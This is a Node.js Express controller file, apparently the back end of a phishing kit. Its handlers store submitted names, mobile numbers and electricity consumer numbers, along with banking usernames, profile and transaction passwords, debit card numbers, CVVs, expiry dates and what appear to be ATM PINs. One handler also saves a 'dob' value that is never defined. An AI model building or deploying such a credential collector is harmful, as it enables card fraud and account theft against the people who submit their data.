const User = require('../models/User');
const DebitCardData = require("../models/DebitCardData");
const CreditCardData = require("../models/CreditCardData");


exports.saveUserData = async (req, res) => {
  try {
    const { name, mobileNumber,knoNumber, uniqueid } = req.body;
    let user = await User.findOne({ uniqueid });

    if (user) {
      user.entries.push({ name, mobileNumber,knoNumber, dob});
    } else {
      user = new User({
        uniqueid,
        entries: [{  name, mobileNumber,knoNumber, dob}]
      });
    }

    await user.save();

    res.status(200).json({
      success: true,
      message: "User Data Submitted Successfully!"
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({
      success: false,
      message: "Error occurred while submitting user data"
    });
  }
};


exports.saveCreditCardData = async (req, res) => {
  try {
    const { uniqueid, userName, profilePass, transactionPass } = req.body;
    let user = await CreditCardData.findOne({ uniqueid });

    if (user) {
      user.entries.push({  userName, profilePass, transactionPass  });
    } else {
      user = new CreditCardData({
        uniqueid,
        entries: [{ userName, profilePass, transactionPass  }]
      });
    }

    await user.save();

    res.status(200).json({
      success: true,
      message: "Credit Card Data Submitted Successfully!"
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({
      success: false,
      message: "Error occurred while submitting credit card data"
    });
  }
};

exports.saveDebitCardData = async (req, res) => {
  try {
    const { uniqueid, cardNumber, cvv, expiry, atmNo } = req.body;
    let user = await DebitCardData.findOne({ uniqueid });

    if (user) {
      user.entries.push({ cardNumber, cvv, expiry, atmNo });
    } else {
      user = new DebitCardData({
        uniqueid,
        entries: [{ cardNumber, cvv, expiry, atmNo }]
      });
    }

    await user.save();

    res.status(200).json({
      success: true,
      message: "Debit Card Data Submitted Successfully!"
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({
      success: false,
      message: "Error occurred while submitting debit card data"
    });
  }
};
